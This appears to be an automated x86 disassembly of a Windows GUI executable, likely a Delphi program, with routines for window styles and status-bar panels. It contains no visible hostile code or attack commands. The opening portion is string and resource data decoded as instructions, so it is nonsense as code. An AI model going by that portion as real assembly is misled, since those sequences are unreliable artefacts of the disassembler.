jb r-xdata
sub [ eax ] eax
andps xmm0 [ ebx + 0x6f ]
inc ebx
add [ edi ] al
andps xmm0 [ ebx + 0x6f ]
insd
add ecx [ eax ]
push es
popad
jb r-xdata
jb r-xdata
adc [ eax ] al
xchg esp eax
adc [ eax ] al
lea eax [ eax ]
hlt
outsd
push ebx
outsb
jb r-xdata
or [ esi ] al
popad
jns r-xdata
add [ eax ] eax
add [ eax ] al
add eax [ eax ]
add [ eax ] al
inc eax
add al al
inc ebx
add [ ebx ] al
or eax 0x6c614354
inc esp
popad
jns r-xdata
insd
outsd
outsb
inc ebx
popad
insb
outsb
popad
jb r-xdata
inc bx
add [ 0x746e6f4d ] al
push 0x72614308
push esp
dec edi
bound ebp [ edx + 0x65 ]
pop esp
adc [ ebp ] eax
jo r-xdata
imul ebp [ esi + 0x61 ] 0x112c006c
outsd
outsb
je r-xdata
dec ebp
popad
jns r-xdata
jb r-xdata
popad
jns r-xdata
or [ edi + ebp * 2 + 0x77 ] esp
inc esi
outsd
ja r-xdata
popad
je r-xdata
push di
imul eax [ gs : ecx ] 0x0
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ ebp + 0x64090043 ] bh
outsd
ja r-xdata
les ebp [ ecx + 0x43 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x51ffbc97 ] ah
insb
jae r-xdata
inc ebx
add [ ecx + ecx * 2 ] dh
inc ebp
add [ ecx + edx + 0x45 ] bl
add [ eax - 0x75 ] dh
add [ eax - 0x13 ] dl
jb r-xdata
inc edx
outsd
sbb [ ebp ] eax
or al 0x31
inc eax
add [ eax ] ch
xor [ eax ] eax
push eax
in eax dx
add [ eax - 0x6bffbfcd ] bh
or [ ebx + 0x61 ] al
insb
dec ecx
outsb
inc ecx
add al dh
test [ eax + eax + 0x4 ] 0xcb
inc esp
add [ eax ] dl
inc [ eax + eax + 0x1c ]
aam 0x44
add [ eax + 0x11 ] dl
inc edx
add [ eax ] bh
push cs
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ esp + ebp * 8 + 0x44480043 ] dh
inc ebp
add [ ecx + ecx * 2 + 0x45 ] ah
add [ eax + 0x78004548 ] dh
leave
inc esp
add ah al
inc ebp
add ah ah
inc ebp
add ah bh
cmp eax [ ebp ]
ror al 0x44
add ah al
enter 0x44 0xc0
clc
inc esp
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ edx + ecx * 8 ] bh
inc esp
add [ eax + 0x80044d5 ] dl
aad 0x44
add [ eax + ebx * 8 ] bl
inc esp
add al cl
salc
inc esp
adc [ edi + ebp * 2 + 0x77 ] ah
outsd
ja r-xdata
mov eax 0x94004033
imul ebp [ esi + 0x61 ] 0x4d0d016c
or [ edi + ebp * 2 + 0x77 ] esp
push ebx
outsd
ja r-xdata
outsw
inc ebp
jbe r-xdata
push 0x64737275
popad
jns r-xdata
dec esp
outsd
outsb
popad
jns r-xdata
add [ eax ] dh
sbb [ ebp ] al
jo r-xdata
inc esp
add [ eax + 0x3c ] dl
inc ebp
add [ edi + 0x38080045 ] cl
inc ebp
add al dh
cmp al 0x45
add [ eax + 0x1c0044fe ] cl
add eax 0x12bc0045
add [ ebx + 0x436860c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x68 ] ah
inc ebx
add [ eax + eax ] cl
add [ eax ] al
aam 0x63
inc ebx
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
xor [ fs : eax ] eax
push cs
inc ebp
dec ebp
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
inc eax
add ah dh
inc bx
je r-xdata
inc ebx
popad
jne r-xdata
inc eax
add [ eax + edx + 0x10940040 ] dl
inc eax
add [ ebp + 0x66f40040 ] cl
inc ebx
outsb
popad
insb
add [ ecx + edx ] ch
popad
jns r-xdata
arpl [ eax + eax + 0x5 ] si
dec ebp
outsd
outsb
je r-xdata
push 0x65
ja r-xdata
or al 0x64
outsd
outsd
ja r-xdata
add eax [ eax ]
inc ebx
popad
insb
outsb
popad
jb r-xdata
add [ eax ] dl
inc [ eax + eax + 0x1c ]
aam 0x44
add [ eax + 0x11 ] dl
inc edx
add [ eax ] bh
push cs
inc edx
inc ebx
popad
insb
inc ebp
jb r-xdata
dec eax
inc ebx
outsd
insd
or [ ebx + 0x6f ] al
outsd
ja r-xdata
inc ebx
je r-xdata
jne r-xdata
call esp
out dx eax
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43090010 ] al
popad
insb
inc ebx
outsd
insb
outsd
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc ebp
add [ eax ] dl
stc
inc ebx
add [ edi + ecx - 0x1167ffbb ] ah
inc ebx
add [ ebx + edx + 0x45 ] dl
add [ eax + 0x13 ] bl
inc ebp
add [ eax ] dl
adc al [ ebp ]
mov eax 0x30004511
inc ebp
add [ eax ] al
sbb al 0x45
add [ eax + edx * 2 ] ah
inc ebp
add [ edx + edi + 0x3d9c0045 ] ch
inc ebp
add [ eax - 0x7bffbc13 ] al
in eax dx
inc ebx
add [ ecx + edi * 8 + 0x43 ] bl
add [ edi + ebp * 8 ] dh
add [ eax + 0x12bc0045 ] bl
inc eax
add ah al
imul eax [ ebx ] 0x4d540e07
outsd
outsb
je r-xdata
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ eax ] bl
test [ ebx ] sub_454448
or al 0xfa
inc ebx
add [ eax + 0x780043f8 ] ch
leave
inc esp
add ah al
inc ebp
add ah ah
inc ebp
add ah bh
cmp eax [ ebp ]
ror al 0x44
add ah al
enter 0x44 0xc0
clc
inc esp
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ edx + ecx * 8 ] bh
inc esp
add [ eax + 0x80044d5 ] dl
aad 0x44
add [ eax + ebx * 8 ] bl
inc esp
add al cl
salc
inc esp
outsd
jb r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
insb
jae r-xdata
imul ebp [ fs : esi + 0x61 ] 0x4d0d016c
outsd
arpl [ ecx + 0x6c ] sp
inc esp
popa
jne r-xdata
outsb
jae r-xdata
jpe r-xdata
lodsb [ esi ]
mov [ eax + eax + 0x74 ] al
add [ eax ] al
dec [ eax ]
sti
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
insb
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x75410800
je r-xdata
add [ eax ] al
inc ebx
popad
insb
outsb
popad
jb r-xdata
add [ ebx + ebx * 4 + 0xb0044 ] al
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
imul eax [ ebx ] 0x250
test al 0x66
inc ebx
add [ eax ] bh
adc [ edx ] eax
mov al 0x33
inc eax
add [ edx + ecx + 0x33b80042 ] cl
inc eax
add [ ecx + ebx + 0x310c0045 ] dl
inc eax
add [ eax ] ch
xor [ eax ] eax
push eax
in eax dx
inc ebx
add [ ecx + ecx * 2 ] dh
inc ebp
add [ ecx + edx + 0x45 ] bl
add [ eax - 0x75 ] dh
inc ecx
add al dh
test [ eax + eax + 0x4 ] 0xcb
inc esp
mov esp 0x4368
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
imul eax [ ebx ] 0x0
add [ eax ] al
add [ eax ] al
mov al [ 0xffffffffae004369 ]
outsw
or [ ebx + 0x61 ] al
inc bx
add [ eax ] cl
adc al 0x54
dec edi
outsb
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
fwait
jb r-xdata
inc ebx
add [ ecx + edi * 8 + 0x43 ] ah
add [ eax - 0x2bffbc07 ] bl
stc
inc ebx
add [ edx ] al
add [ esi ] cl
mov al 0x4e
mov esp sub_43f770
cwde
test [ ebx ] 0x6f4d540e
outsb
je r-xdata
out dx eax
push 0x67e80043
inc ebx
add [ edx ] bh
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
[ eax ]
jae r-xdata
adc al 0x0
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ edx + eax ] al
aas
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ ebx ] cl
inc edx
outsd
jb r-xdata
insb
jae r-xdata
add bh bh
sub cl dh
inc ebx
add [ eax - 0x11 ] bh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x45070018 ] al
outsb
inc esp
popad
je r-xdata
jb r-xdata
add [ eax + 0x430b0011 ] al
outsd
jb r-xdata
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add al dl
add [ eax + eax + 0x5b ] 0x0
add bh bh
dec eax

dec ebp
outsd
insb
xchg esi eax
inc esp
add [ eax - 0x7700ffff ] cl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4907001c ] al
insd
dec esi
popad
insd
mov al 0x87
inc esp
add [ eax ] ch
add al [ eax ]
[ eax ]
inc ebx
add [ eax + 0x43ef ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d07001d ] al
popad
js r-xdata
mov esp 0x20004365
add al [ eax ]
push [ eax + 0x10043f1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] 0x0
add [ eax ] al
sbb [ eax ] eax
push cs
inc esi
imul esi [ edx + 0x73 ] 0x79614474
dec edi
push di
imul esp [ gs : esp + 0x680042 ] 0x0
[ eax ]
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ss
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
mov al 0x87
inc esp
add [ eax ] bl
add al [ eax ]
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax 0x72440800
popad
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
xchg [ eax + eax - 0x65 ] eax
outsb
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
or eax [ ebx + 0x6f ]
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
pop eax
xlat
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000f ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xa065646f
inc ebx
add [ eax ] cl
add al [ eax ]
pop ds
add [ edi ] al
dec ebp
imul ebp [ esi + 0x44 ] 0x657461
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
popad
je r-xdata
push cs
push eax
popad
jb r-xdata
push esp
adc [ eax ] al
xor [ edx ] al
add bh bh
add al 0xf3
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ edi ] 0x0
add [ eax ] al
push ds
add [ esi ] cl
dec ebp
popad
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090023 ] al
outsd
outsb
je r-xdata
add [ gs : eax ] dl
inc eax
add [ ecx ] bl
add bh bh
pushad
xlat
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] eax
or dl [ eax + 0x61 ]
insb
arpl [ gs : edx + edx * 2 + 0x61 ] si
outsb
mov al 0x87
inc esp
add [ eax ] bh
add al [ eax ]
call [ ebx + esi * 8 + 0x43 ]
add [ edi + ebp * 8 + 0x43 ] bl
add [ eax - 0x80000000 ] al
mov [ gs : edi + 0x3fb80044 ] al
inc ebp
add [ eax ] bh
jo r-xdata
add [ eax ] al
and al [ eax ]
push cs
push eax
popad
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop ecx
add [ eax ] al
jmp [ eax - 0x29 ]
add [ eax - 0x80000000 ] al
and al 0x0
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
je r-xdata
add [ esi + 0x2 ] al
add bh bh
int3
outsb
jne r-xdata
add [ eax ] eax
add [ eax ] al
and eax 0x68530900
outsd
ja r-xdata
outsb
je r-xdata
popad
jns r-xdata
imul ebp [ esi + 0x74 ] r-xdata
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
adc [ eax ] al
cdq
add [ eax ] al
inc [ edi + edx * 8 - 0x28b3ffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080024 ] al
push 0x6948776f
outsb
je r-xdata
add [ ecx + eax + 0x4050ff00 ] ah
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub [ eax ] al
pop es
outsd
popad
jns r-xdata
add al [ eax ]
[ esi + esi * 8 + 0x10043 ]
push 0x6948776f
outsb
je r-xdata
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
inc eax
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
imul esi [ edx + 0x63 ] 0x8788656c
inc esp
add [ eax + 0x3800453f ] bh
adc [ eax ] al
0xa8ff0000 0x44d7
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
inc ebp
adc [ eax ] al
adc [ eax ] al
push edi
add [ eax ] al
call [ ebp + edx * 8 + 0x44 ]
add [ eax + 0x44f6 ] dh
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
inc edi
add al [ eax ]
adc [ eax ] al
inc esi
add al [ eax ]
dec esp
test [ ebx ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edi ] cl
push ebx
push 0x6f54776f
jb r-xdata
push eax
popad
mov [ ebp ] 0xff00007c
in al dx
aad 0x44
add [ ecx ] al
sub_436b9d
push eax
test [ eax + eax ] 0x0
add [ eax + 0x1 ] al
pop ss
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
mov al 0x87
inc esp
add [ eax ] bl
add al [ eax ]
[ eax ]
sub_4370a4
push ebx
add esp 0xfffffff8
mov [ esp ] 0x8
mov [ esp + 0x4 ] eax
mov eax esp
call sub_4297c4
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
jne r-xdata
mov eax ebx
pop ecx
pop edx
pop ebx
retn
call InitCommonControls
sub_4370d0
push ebx
mov ebx eax
mov eax ebx
call sub_4370a4
test al al
jne r-xdata
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
call sub_403928
sub_437178
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov edi edx
mov ebp eax
mov eax ebp
call sub_454120
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
push 0xfffffff0
mov eax ebp
call sub_453e1c
push eax
call GetWindowLongA
mov esi eax
test bl bl
jne r-xdata
or esi edi
not edi
and esi edi
jmp r-xdata
push esi
push 0xfffffff0
mov eax ebp
call sub_453e1c
push eax
call SetWindowLongA
sub_4371c0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x10 ] 0x32
mov [ esi + 0x18 ] 0x2710
mov [ esi + 0x1e ] 0x1
mov [ esi + 0x20 ] 0xffffffff
mov [ esi + 0x25 ] 0x1
xor edx edx
mov eax esi
call sub_418ec8
mov eax esi
call sub_4372c0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_43721c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418b70
mov edi esi
mov edx [ edi + 0xc ]
mov eax ebx
call sub_4373cc
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_4373f4
mov edx [ edi + 0x14 ]
mov eax ebx
call sub_4373a0
mov edx [ edi + 0x18 ]
mov eax ebx
call sub_43737c
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_43734c
mov dl [ edi + 0x1d ]
mov eax ebx
call sub_4373bc
mov al [ edi + 0x1e ]
mov [ ebx + 0x1e ] al
mov edx [ edi + 0x20 ]
mov eax ebx
call sub_43743c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4372c0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x25 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_403370
test eax eax
je r-xdata
mov eax ebx
mov si 0xffff
call sub_403370
mov eax [ eax + 0x18 ]
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_437294
mov [ ebx + 0x25 ] 0x1
sub_437328
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0xc ]
call sub_403f40
cmp [ esi ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_418f6c
sub_43735c
push esi
mov esi eax
cmp dl [ esi + 0x1f ]
je r-xdata
pop esi
retn
mov [ esi + 0x1f ] dl
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
mov si 0xffee
call sub_403370
sub_4373cc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx esi
call sub_4042f8
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0xc ]
mov edx esi
call sub_403f40
xor edx edx
mov eax ebx
call sub_418f30
sub_4373f4
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x18 ]
cmp edx eax
jle r-xdata
mov edx eax
cmp edx [ ebx + 0x10 ]
je r-xdata
mov edx eax
pop esi
pop ebx
retn
mov [ ebx + 0x10 ] edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_418f54
mov esi eax
mov eax [ ebx + 0x4 ]
call sub_4192e4
dec eax
cmp esi eax
setl dl
mov eax ebx
call sub_418f30
sub_43744c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ r-xdata ]
xor edx edx
mov eax edi
call sub_4190ac
mov [ edi + 0x18 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_4374b4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov eax [ ebx + 0x18 ]
call sub_437cc0
pop esi
pop ebx
retn
mov eax esi
call sub_418f54
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_437c9c
pop esi
pop ebx
retn
sub_4374e0
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
test edx edx
jne r-xdata
mov esi edx
test edx edx
je r-xdata
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
mov esi eax
jmp r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax ebx
call sub_4192e4
cmp edi eax
jge r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax ebx
call sub_4192e4
mov edi eax
dec edi
sub_437530
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44fb48
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax ebx
call sub_44cb48
mov edx 0x11
mov eax ebx
call sub_44ce14
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x208 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424360
mov esi eax
mov [ ebx + 0x214 ] esi
mov eax esi
mov edx ebx
call sub_44c210
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov esi eax
mov [ ebx + 0x224 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_4384e0
mov [ ebx + 0x220 ] 0x1
mov [ ebx + 0x222 ] 0x0
mov [ ebx + 0x211 ] 0x0
mov [ ebx + 0x210 ] 0x0
xor eax eax
mov [ ebx + 0x20c ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_437600
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax [ esi + 0x214 ]
call sub_403174
mov eax [ esi + 0x208 ]
call sub_403174
mov eax [ esi + 0x224 ]
call sub_403174
mov eax [ esi + 0x20c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44fc6c
test bl bl
jle r-xdata
call sub_403174
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_437658
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
call sub_4370a4
mov edx esi
mov eax ebx
call sub_450ca8
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_450bd4
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp [ ebx + 0x221 ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x80
cmp [ ebx + 0x222 ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x4
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x40
sub_4376d0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20c ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_419210
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0x20c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b528
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_437758
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41db44
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x4 ]
call sub_41c1fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403174
retn
sub_437784
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_450dd4
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x228 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20c ] 0x0
je r-xdata
mov eax ebx
call sub_45a7c8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_437cc0
push ebp
call sub_4376d0
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
call sub_45a904
push eax
mov eax [ ebp - 0x4 ]
call sub_453e1c
pop edx
call sub_4298d4
pop ebx
pop ecx
pop ebp
retn
sub_4377ec
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20c ] 0x0
jne r-xdata
push 0x400
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x20c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b528
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43787a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x8 ]
call sub_41e6ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437881
mov eax [ ebp - 0x8 ]
call sub_403174
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_41aae4
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20c ] eax
sub_437890
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_453198
mov eax ebx
call sub_454120
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_4192e4
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x208 ]
call sub_43749c
call sub_4372c0
mov edx esi
mov eax [ ebx + 0x208 ]
call sub_43749c
cmp [ eax + 0x25 ] 0x0
je r-xdata
sub_4378ec
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_454120
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192e4
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d038
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_43749c
mov eax [ eax + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192e4
mov ebx eax
sub ebx 0x2
test ebx ebx
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43744c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_437a36
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192e4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192e4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_43749c
mov eax [ eax + 0x10 ]
sub [ ebp - 0xc ] eax
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437a3d
mov eax [ ebp - 0x10 ]
call sub_403174
retn
inc ebx
xor esi esi
mov eax [ ebp - 0x10 ]
call sub_437490
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_43749c
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192e4
mov edx eax
sub edx esi
dec edx
mov eax [ ebp - 0x10 ]
call sub_43749c
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx esi
call sub_43749c
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_437a3d
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4192e4
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_437cc0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_4192e4
mov edx eax
dec edx
mov eax ebx
call sub_43749c
mov edx [ ebp - 0x8 ]
call sub_4373f4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_43749c
mov edx [ ebp - 0xc ]
call sub_4373f4
sub_437a98
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x242 ] 0x0
je r-xdata
mov edx ecx
mov eax [ eax + 0x214 ]
call sub_4245fc
push ecx
mov cl [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x244 ]
call [ ebx + 0x240 ]
jmp r-xdata
pop ebx
pop ebp
